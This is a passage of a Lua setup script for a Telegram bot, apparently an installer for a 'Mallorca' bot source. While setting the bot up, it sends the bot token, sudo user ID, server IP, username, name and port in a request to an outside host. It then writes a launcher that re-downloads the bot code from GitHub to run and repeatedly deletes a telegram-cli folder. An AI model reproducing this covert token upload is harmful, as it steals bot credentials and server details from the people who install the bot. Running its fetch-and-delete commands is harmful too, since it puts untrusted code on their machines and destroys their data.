...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://Mallorca-source.tk/MallorcaTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Mallorca::")
local RunBot = io.open("MALLORCAA", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/MALLORCAA
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr MALLORCAA.lua
wget "https://raw.githubusercontent.com/MALLORCAA/MALLORCAA/master/MALLORCAA.lua"
while(true) do
rm -fr ../.telegram-cli
